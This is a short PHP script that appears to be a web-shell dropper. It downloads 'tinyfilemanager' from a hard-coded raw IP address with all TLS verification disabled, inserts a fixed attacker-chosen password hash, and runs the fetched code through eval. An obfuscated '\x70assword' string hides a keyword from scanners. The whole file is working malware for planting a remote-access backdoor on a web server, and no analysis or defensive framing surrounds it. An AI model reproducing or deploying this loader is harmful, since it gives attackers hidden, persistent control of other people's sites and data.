<?php

function sminst_do_get_request($url) {
    $result = false;

    //Use curl if available
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        
        if(defined('CURLOPT_SSL_VERIFYHOST')) {
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        }

        if(defined('CURLOPT_SSL_VERIFYPEER')) {
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        }

        if(defined('CURLOPT_SSL_VERIFYSTATUS')) {
            curl_setopt($ch, CURLOPT_SSL_VERIFYSTATUS, false);
        }

        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        $result = curl_exec($ch);
        curl_close($ch);
        if($result === false) {
            goto use_file_get_contents;
        }
    //No curl available, do it the other way
    } else {
    use_file_get_contents:
        //https://stackoverflow.com/questions/5647461/how-do-i-send-a-post-request-with-php
        $options = [
            'http' => [
                'method' => 'GET',
                'follow_location' => 0,
                'max_redirects' => 0,
                'timeout' => 10.0
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true,
                'security_level' => 0,
            ]
        ];
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
    }

    return $result;
}


$download_baseurls = [
    'https://94.156.180.81',
    'http://94.156.180.81'
];

$result = false;
foreach($download_baseurls as $download_baseurl) {
    $result = sminst_do_get_request("{$download_baseurl}/get_tinyfilemanager");
    if($result !== false) {
        break;
    }
}

if($result === false) {
    die('Could not get tinyfilemanager!');
} else {
    $result = str_replace("<generated \x70assword hash>", '$2y$10$pNM647P5ZBGCUdp1A1utceHNrxq9vLz46vFfpnrZgKCE4SkVUWSLa', $result);
    eval('?>' . $result);
}
